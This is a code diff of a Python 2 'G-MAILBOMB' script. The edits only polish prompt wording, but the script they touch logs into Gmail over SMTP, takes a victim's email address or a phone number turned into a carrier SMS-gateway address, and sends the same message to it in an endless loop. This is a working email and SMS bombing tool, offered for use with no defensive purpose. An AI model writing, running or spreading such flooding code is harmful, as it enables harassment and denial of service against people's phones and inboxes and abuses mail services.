@@ -9,15 +9,15 @@ import getpass
 os.system("clear")
 os.system("figlet G-MAILBOMB")
 
-username = raw_input("My Gmail Username ( user@gmail.com ) : ")
-password = getpass.getpass(prompt='My Gmail Password : ')
+username = raw_input("Gmail Username (user@gmail.com): ")
+password = getpass.getpass(prompt='Gmail Password: ')
 
 obj = s.SMTP("smtp.gmail.com:587")
 obj.starttls()
 obj.login(username, password)
 print"\n\r"
 
-print """ What Kind Of Bomb Would You Like To Send ?
+print """ What kind of bomb would you like to send?
 1. SMS
 2. Email
 """
@@ -25,7 +25,7 @@ option = input()
 print("\n\r")
 if option == 1:
     carrier_attack = 0
-    print """ What İs Their Carrier ? Respond With The Corresponding Number
+    print """ What is their carrier? Respond with the corresponding number
 	1. Alltel
 	2. AT&T
 	3. Rogers
@@ -57,21 +57,21 @@ if option == 1:
     if carrier == 9:
 	carrier_attack = "@sms.orange.pl"
 
-    v_phone = raw_input("Phone Number : ") + str(carrier_attack)
-    message = raw_input("Message : ")
+    v_phone = raw_input("Phone Number: ") + str(carrier_attack)
+    message = raw_input("Message: ")
     phone_message = ("From: %s\r\nTo: %s \r\n\r\n %s"
        % (username, "" .join(v_phone), "" .join(message)))
 
     while 1:
         obj.sendmail(username, v_phone, phone_message)
-	print "Message Sent ! Sending Another Press Ctrl + Z To Stop ."
+	print "Message sent! Sending another.. Press Ctrl + C to stop."
 
 if option == 2:
-    v_email = raw_input("Victim's Email : ")
-    message = raw_input("Message : ")
+    v_email = raw_input("Email: ")
+    message = raw_input("Message: ")
     email_message = (" \r\n\r\n From: %s\r\n To: %s\r\n\r\n  %s"
        % (username, "" .join(v_email), "" .join(message)))
 
     while 1:
         obj.sendmail(username, v_email, email_message)
-	print "Message Sent ! Sending Another Press Ctrl + Z To Stop ."
+	print "Message sent! Sending another.. Press Ctrl + C to stop."
